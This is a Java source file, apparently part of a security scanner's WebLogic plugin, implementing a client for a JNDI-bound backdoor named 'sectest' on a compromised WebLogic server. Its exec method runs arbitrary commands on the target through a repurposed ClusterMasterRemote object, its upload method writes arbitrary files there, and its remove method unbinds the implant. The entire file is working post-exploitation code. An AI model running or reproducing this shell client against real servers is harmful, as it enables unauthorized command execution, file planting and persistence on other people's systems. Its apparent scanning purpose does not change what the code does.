package com.gbw.scanner.plugins.scripts.weblogic;

import com.gbw.scanner.Host;
import com.gbw.scanner.utils.Base64Utils;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.iiop.IOPProfile;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Hashtable;

public class GBWJNDIShellClient {

    private static InitialContext getInitContext(GBWScanWeblogicConfig config, Host host){

        try{

            String url = String.format("%s://%s:%d", host.getProto(),host.getIp(),host.getPort());

            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
            env.put(Context.PROVIDER_URL, url);
            env.put("weblogic.jndi.requestTimeout", (long)config.getReadTimeout());
            if (host.getProto().equals("iiop")) {
                IOPProfile.IP = host.getIp();
                IOPProfile.PORT = host.getPort();
                env.put("weblogic.jndi.requestTimeout", config.getReadTimeout() + "");
            }
            InitialContext initialContext = new InitialContext(env);
            return initialContext;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public static String exec(GBWScanWeblogicConfig config,Host host,String cmd) {
        try {
            Object obj= getInitContext(config,host).lookup("sectest");;
            if(obj instanceof ClusterMasterRemote) {
                ClusterMasterRemote shell = (ClusterMasterRemote)obj;
                String result = null;
                if (shell != null) {
                    result = shell.getServerLocation(cmd);
                    if(result!=null){
                        result=result.trim();
                    }
                }
                return result;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }catch (Error e) {
            e.printStackTrace();
        }
        return null;
    }

    public static void upload(GBWScanWeblogicConfig config,Host host, String path, String text) {
        try {
            Object obj= getInitContext(config,host).lookup("sectest");;
            if(obj instanceof ClusterMasterRemote) {
                ClusterMasterRemote shell = (ClusterMasterRemote)obj;
                if (shell != null) {
                    shell.setServerLocation(path, Base64Utils.encode(text.getBytes()));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }catch (Error e) {
            e.printStackTrace();
        }
    }

    public static void remove(GBWScanWeblogicConfig config,Host host) {
        exec(config,host,"unbind");
    }
}
